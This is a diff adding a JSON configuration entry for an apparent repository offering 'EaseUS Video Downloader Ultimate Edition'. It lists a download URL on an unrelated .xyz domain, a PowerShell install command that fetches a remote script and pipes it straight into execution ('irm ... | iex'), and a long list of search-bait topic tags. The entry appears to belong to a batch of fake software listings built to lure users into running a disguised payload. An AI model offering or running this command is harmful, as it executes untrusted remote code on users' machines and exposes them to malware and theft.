@@ -1,0 +1,29 @@
+{
+  "repo": "easeus-video-downloader-ultimate-edition",
+  "product": "EaseUS Video Downloader Ultimate Edition",
+  "kind": "video",
+  "install_type": "download",
+  "download_url": "https://easeus-downloader.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "video",
+  "topics": [
+    "easeus-downloader-setup",
+    "easeus-downloader-local-install",
+    "easeus-downloader-latest-build",
+    "media-encoder",
+    "easeus-downloader-windows-guide",
+    "easeus-downloader-installer",
+    "frame-accurate",
+    "render-queue",
+    "easeus-downloader-build",
+    "user-manual",
+    "windows-10",
+    "getting-started",
+    "windows-11",
+    "easeus-downloader-suite",
+    "install-guide"
+  ]
+}
